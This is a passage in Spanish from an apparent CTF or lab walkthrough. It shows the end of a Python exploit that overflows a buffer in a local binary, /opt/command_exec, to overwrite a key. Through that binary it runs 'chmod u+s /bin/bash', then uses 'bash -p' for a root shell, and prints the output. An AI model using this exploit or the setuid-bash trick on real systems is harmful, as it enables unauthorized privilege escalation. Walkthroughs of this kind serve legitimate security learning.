# - dead: Sobrescribimos 'key' con 0xdead
payload = RIP + dead

# 6. Nombre del binario que vamos a ejecutar
# En este caso, es un binario llamado 'command_exec' que se encuentra en el directorio /opt y lo ejecuta directamente
program = ["/opt/command_exec"]

# 7. Ejecutar el binario con un proceso hijo utilizando Popen.
# Utilizamos stdin=subprocess.PIPE para poder enviar datos (el payload) al binario de forma controlada.
process = subprocess.Popen(
    program, stdin=subprocess.PIPE
)

# 8. Enviar el payload al programa a través de stdin.
# El primer payload sobrescribe la ubicación de la 'key' con el valor 0xdead.
process.stdin.write(payload + b"\n")
process.stdin.flush()  # Aseguramos que el payload se envíe correctamente.

# 9. Ahora que hemos sobrescrito la 'key', enviamos el comando adicional que se ejecutará,
# en este caso, 'chmod u+s /bin/bash' para cambiar los permisos de bash y permitir ejecutar bash como root.
process.stdin.write(command + b"\n")
process.stdin.flush()

# 10. Esperamos a que termine el proceso.
# Esto asegura que el binario termine su ejecución antes de finalizar el script.
process.wait()
```

Si lo ejecutamos vemos lo siguiente:

```shell
python3 exploit.py
```

Info:

```shell
Escribe la contraseña: Estás en modo administrador (key = dead)
Escribe un comando:
```

Vamos a ver si ha funcionado listando los permisos de la `bash`:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Vemos que efectivamente a funcionado, por lo que haremos lo siguiente:

```shell
bash -p
```

Y con esto seremos `root`, por lo que ya habremos terminado.
